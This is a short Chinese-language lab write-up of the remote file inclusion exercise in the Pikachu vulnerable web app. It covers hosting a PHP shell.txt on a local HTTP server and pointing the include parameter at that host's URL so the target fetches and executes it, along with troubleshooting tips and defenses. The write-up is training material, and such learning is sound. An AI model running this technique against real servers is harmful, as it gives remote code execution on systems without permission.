---
title: Pikachu-文件包含(远程)
date: 2026-11-23
tags: [Pikachu, WEB, 文件包含]
excerpt: allow_url_include 开着时，包含远程文件就等于执行远程代码。
---

思路：参数被拼进 include，如果服务端允许远程包含，填一个 http 地址就能把远程文件拉下来当 PHP 执行。

问题：
1. 不确定远程包含是否可用。
2. 不知道恶意文件放哪。
3. 地址填了没反应。

解决：
1. 先在本地起一个 HTTP 服务，放一个 shell.txt（内容是 PHP 代码）。
2. 参数填 http://你的IP:8000/shell.txt，看是否执行。
3. 不执行的话，检查 allow_url_include 是否开启。
4. 执行成功后读目标文件，提交通过。

补充：
1. 远程包含依赖 allow_url_include=On，默认关闭，所以比本地包含少见。
2. 后缀用 .txt 避免被当成脚本下载。
3. 防御：关闭 allow_url_include，include 路径白名单。

工具：Burp Suite、python -m http.server

踩坑记录：
1. 本地服务只监听 127.0.0.1，VM 里的服务端访问不到。
2. 服务器拉文件时被防火墙拦，检查了网络才排除。
3. 文件里 PHP 标签写错，执行了但没输出。

总结：远程包含把"读文件"升级成"执行任意代码"。判断能不能用，测试成本很低，值得每次都试一下。
